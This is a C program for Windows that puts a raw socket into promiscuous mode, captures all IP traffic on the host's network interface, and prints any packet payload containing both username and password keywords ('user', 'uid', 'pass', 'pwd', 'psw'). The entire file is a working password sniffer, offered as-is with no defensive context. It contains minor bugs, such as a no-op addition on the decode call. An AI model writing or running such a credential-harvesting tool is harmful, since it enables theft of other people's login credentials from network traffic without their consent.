#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib,"WS2_32.lib")
#pragma warning(disable: 4996)

#define MAX_PACK_LEN 4096
#define MAX_ADDR_LEN 16
#define MAX_HOSTNAME_LEN 255
#define SIO_REVALL _WSAIOW(IOC_VENDOR,1)

typedef struct _iphdr
{
	unsigned char h_lenver;
	unsigned char tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int sourceIP;
	unsigned int destIP;
}IP_HEADER;

SOCKET SockRaw;
int DecodeIpPack(char const*, int);
void CheckSockError(int, char const*);

void main(int argc, char const** argv)
{
	int iErrorCode;
	char RecvBuf[MAX_PACK_LEN] = { 0 };
	WSADATA wsaData;
	char name[MAX_HOSTNAME_LEN];
	struct hostent* pHostent;
	SOCKADDR_IN sa;
	DWORD dwBufferLen[10];
	DWORD dwBufferInLen = 1;
	DWORD dwBytesReteuned = 0;

	printf("----Now sniffing pass,CTRL+C to exit...\n\n");
	iErrorCode = WSAStartup(0x0202, &wsaData);
	CheckSockError(iErrorCode, "WSAStartup");
	SockRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	CheckSockError(SockRaw, "socket");

	iErrorCode = gethostname(name, MAX_HOSTNAME_LEN);
	CheckSockError(iErrorCode, "gethostname");
	pHostent = (struct hostent*)malloc(sizeof(struct hostent));
	pHostent = gethostbyname(name);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(9999);
	memcpy(&sa.sin_addr.S_un.S_addr, pHostent->h_addr_list[0], pHostent->h_length);

	iErrorCode = bind(SockRaw, (PSOCKADDR)&sa, sizeof(sa));
	CheckSockError(iErrorCode, "bind");

	iErrorCode = WSAIoctl(SockRaw, SIO_REVALL, &dwBufferInLen, sizeof(dwBufferInLen), &dwBufferLen, sizeof(dwBufferLen), &dwBytesReteuned, NULL, NULL);
	CheckSockError(iErrorCode, "Ioctl");

	while (1)
	{
		memset(RecvBuf, 0, sizeof(RecvBuf));
		iErrorCode = recv(SockRaw, RecvBuf, sizeof(RecvBuf), 0);
		CheckSockError(iErrorCode, "recv");
		iErrorCode + DecodeIpPack(RecvBuf, iErrorCode);
		CheckSockError(iErrorCode, "Decode");
	}
}
int DecodeIpPack(char const*buf, int iBufSize)
{
	IP_HEADER *pIpheader;
	int iIphLen, iTTL;
	char szSourceIP[MAX_ADDR_LEN], szDestIP[MAX_ADDR_LEN];
	SOCKADDR_IN saSource, saDest;

	const char *SearchPass, *start, *end;
	pIpheader = (IP_HEADER*)buf;
	saSource.sin_addr.s_addr = pIpheader->sourceIP;
	strncpy(szSourceIP, inet_ntoa(saSource.sin_addr), MAX_ADDR_LEN);
	saDest.sin_addr.s_addr = pIpheader-> destIP;
	strncpy(szDestIP, inet_ntoa(saDest.sin_addr), MAX_ADDR_LEN);
	iTTL = pIpheader->ttl;

	iIphLen = sizeof(unsigned long) * (pIpheader->h_lenver & 0xf);
	SearchPass = buf + iIphLen + 20;

	start = strstr(SearchPass, "user");
	if (start == NULL)
		start = strstr(SearchPass, "User");
	if (start == NULL)
		start = strstr(SearchPass, "uid");
	if (start == NULL)
		start = strstr(SearchPass, "Uid");

	end = strstr(SearchPass, "pass");
	if (end == NULL)
		end = strstr(SearchPass, "Pass");
	if (end == NULL)
		end = strstr(SearchPass, "PASS");
	if(end==NULL)
		end = strstr(SearchPass, "pwd");
	if(end==NULL)
		end = strstr(SearchPass, "psw");

	if (start != NULL && end != NULL)
	{
		printf("\n\n----------Print begin : ------------");
		printf("\n%s->%s", szSourceIP, szDestIP);
		printf("bytes=%d TTL=%d \n", iBufSize, iTTL);
		printf("%s", SearchPass);
	}
	return 0;
}
void  CheckSockError(int iErrorCode, char const* pErrorMsg)
{
	if (iErrorCode == SOCKET_ERROR)
	{
		printf("%s Error:%d\n", pErrorMsg, GetLastError());
		closesocket(SockRaw);
		exit(0);
	}
}
